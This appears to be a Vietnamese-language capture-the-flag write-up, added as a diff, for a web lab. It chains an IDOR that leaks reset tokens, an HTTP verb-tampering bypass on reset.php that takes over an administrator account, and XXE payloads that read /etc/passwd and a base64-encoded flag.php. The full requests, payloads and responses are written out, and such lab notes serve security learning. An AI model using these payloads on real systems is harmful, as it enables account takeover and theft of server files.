@@ -1,0 +1,114 @@
+=> login voi credential (hoac la bypass)
+
+=> doc source
+=> thu duoc endpoint
+http://94.237.61.242:30724/api.php/user/id
+
+=> voi id => IDOR tiet lo thong tin ve 1 user
+=> tiep tuc doc source tai endpoint /settings.php
+=> thu duoc endpoint
+http://94.237.61.242:30724/api.php/token/id => cho ta token ung voi user
+http://94.237.61.242:30724/reset.php (POST) param uid=&token=&password=
+=> fuzz het data, thu duoc 1 tai khoan vs id 52 (administrator)
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+
+
+=> ta thu su dung chuc nang reset de reset cho 1 tai khoan nao do 
+- token evil, id victim => tu choi
+- token victim, id evil => tu choi
+- token victim , id victim => tu choi
+=> PHPSESSIONID
+
+=> KO THE BYPASS BANG CACH NAY
+=> AP DUNG VERB TAMPING
+thu voi put,patch,.. => tu choi
+
+thu voi get => PHAI DUNG PARAMETER O URL
+
+http://94.237.61.242:30724/reset.php?uid=&token=&password=
+=> passs
+
+=> Cuop tkhoan admin
+http://94.237.61.242:30724/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=haha
+=> truy cap vao tkhoan admin
+
+
+=> phat hien mot endpoint event.php 
+=> burp phat hien chuc nang post de dat lich event su dung xml
+
+=> nghi ngo xxe, thu su dung chuc nang
+=> POST /addEvent.php HTTP/1.1
+Host: 94.237.61.242:30724
+Content-Length: 151
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://94.237.61.242:30724
+Referer: http://94.237.61.242:30724/event.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=oq83dtma4b97fea5msptk88tbj; uid=52
+Connection: keep-alive
+
+
+            <root>
+            <name>aaa</name>
+            <details>aa</details>
+            <date>0222-12-22</date>
+            </root>
+            
+ => HTTP/1.1 200 OK
+Date: Sun, 27 Jul 2025 05:05:02 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 29
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Event 'aaa' has been created.
+
+=> nhan ra noi dung co the hien thi lai tai element <name>
+
+=> thu payload xxe de doc file /etc/passwd
+
+<!DOCTYPE name [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+            <root>
+            <name>&xxe;</name>
+            <details>aa</details>
+            <date>0222-12-22</date>
+            </root>
+            
+ => thu duoc
+ 
+ event 'root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+.........snipp' has been created.
+
+=> khang dinh bi xxe
+=> doc flag
+
+<!DOCTYPE name [ <!ENTITY xxe SYSTEM "file:///flag.php"> ]>
+            <root>
+            <name>&xxe;</name>
+            <details>aa</details>
+            <date>0222-12-22</date>
+            </root>
+            
+=> tuy nhien ko co gi tra ve do day la file php => chung ta se su dung wrapper php
+
+<!DOCTYPE name [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
+            <root>
+            <name>&xxe;</name>
+            <details>aa</details>
+            <date>0222-12-22</date>
+            </root>
+            
+=> thu duoc
+Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
+
+=> base64 decode => <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
